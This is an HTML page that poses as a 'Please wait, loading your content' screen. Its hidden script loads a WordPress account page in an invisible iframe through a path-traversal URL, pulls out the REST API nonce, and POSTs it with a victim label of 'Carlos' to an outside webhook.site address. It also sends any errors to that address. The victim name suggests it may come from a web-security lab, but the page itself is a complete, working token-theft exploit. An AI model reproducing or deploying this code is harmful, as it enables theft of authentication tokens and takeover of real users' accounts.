<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body>
  <h1>Please wait, loading your content...</h1>

  <script>
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = '/wp-includes/js/api-request.min.js/../../../my-account/edit-account/';
    document.body.appendChild(iframe);

    iframe.onload = function() {
      try {
        const doc = iframe.contentDocument || iframe.contentWindow.document;
        const script = doc.querySelector('#wp-api-request-js-extra');
        
        if (script) {
          const text = script.textContent;
          const nonceMatch = text.match(/"nonce":"([a-f0-9]+)"/);
          
          if (nonceMatch) {
            const nonce = nonceMatch[1];
            fetch('https://webhook.site/8e6d3cb2-a3f0-4286-b5a0-c629298bd1aa', {
              method: 'POST',
              body: JSON.stringify({ nonce: nonce, victim: 'Carlos' }),
              mode: 'no-cors'
            });
          }
        }
      } catch (e) {
        fetch('https://webhook.site/8e6d3cb2-a3f0-4286-b5a0-c629298bd1aa?error=' + encodeURIComponent(e.message), { mode: 'no-cors' });
      }
    };
  </script>
</body>
</html>
